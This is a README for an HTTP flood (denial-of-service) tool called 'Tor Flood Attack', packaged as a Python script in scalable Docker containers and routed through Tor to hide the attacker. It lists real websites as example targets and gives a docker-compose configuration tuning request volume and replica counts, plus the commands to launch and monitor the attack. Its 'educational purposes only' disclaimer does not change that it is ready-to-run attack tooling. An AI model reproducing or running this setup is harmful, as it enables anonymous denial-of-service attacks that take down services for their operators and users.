# Tor Flood Attack 
This is an example of how we can orchestrate an HTTP flood attack. We provide a python script that launches parallel requests to target URLs while being covered by TOR proxy. We also provide a docker image wraped over this script, and a scalable docker-compose configuration. 

This project was designed and intended for educational purposes only. All examples and targets were selected randomly. Use this at yout own risk. This repository may be deleted at any time, please make local backups if needed accordingly.

# Prerequisites
Obviously you need to install [Docker](https://docs.docker.com/engine/install/) and [docker-compose](https://docs.docker.com/compose/install/). Have a good bandwidth, and preferably a good CPU as we rely heavily on parallel HTTP requests here. 

# Configuration
Before launching this I highly suggest you to get familiar with how things can be adjusted in this script.

### Targets
Target settings - all target URLs should be placed in `targets.txt`, please note that all of them are either "http" or "https":
```text
https://www.google.com/
https://yandex.ru/
```

### Performance
All performance settings are located in `docker-compose.yml`:
```yaml
version: "3.9"
services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    environment:
      # How many cycles (epochs) of attacks should be performed
      # This value can be ignored, you can control the attack by stopping docker-compose at any time
      NUMBER_OF_EPOCHS: 40

      # How many URLs from your list will be attacked in parallel
      PARALLEL_LIST_OF_URLS_WORKERS: 2

      # Min/max values that determine how many requests can be simultaneously sent to a single URL
      PARALLEL_SINGLE_URL_MIN_REQUESTS: 150
      PARALLEL_SINGLE_URL_MAX_REQUESTS: 700

      # How many requests on the same URL will be processed in parallel
      PARALLEL_SINGLE_URL_WORKERS: 50

      # Should we use tor? (0 - no, 1 - yes)
      # The default values is 1, and we will print out warnings if you disable it
      # Use at your own risk, only if you know what you're doing
      ENABLE_TOR: 1
    deploy:
      # How scaled this attack is, how many replicas of this container should be deployed
      replicas: 12
      restart_policy:
        condition: any
``` 

This setup has a potential to really warn up your hardware, please lower the settings if you're not sure what stress your PC can handle. For a modest PC it'll look like this:
```yaml
...
NUMBER_OF_EPOCHS: 10
PARALLEL_LIST_OF_URLS_WORKERS: 1
PARALLEL_SINGLE_URL_MIN_REQUESTS: 20
PARALLEL_SINGLE_URL_MAX_REQUESTS: 100
PARALLEL_SINGLE_URL_WORKERS: 10
ENABLE_TOR: 1
...
replicas: 3
...
```

# Running
Launching this script is fairly straight forward - just run docker-compose

Start the containers with scripts via:
```shell script
docker-compose up --build -d
```

Connect to logs to monitor what's going on inside your containers:
```shell script
docker-compose logs -f -t
```

To stop and kill all containers:
```shell script
docker-compose down
```
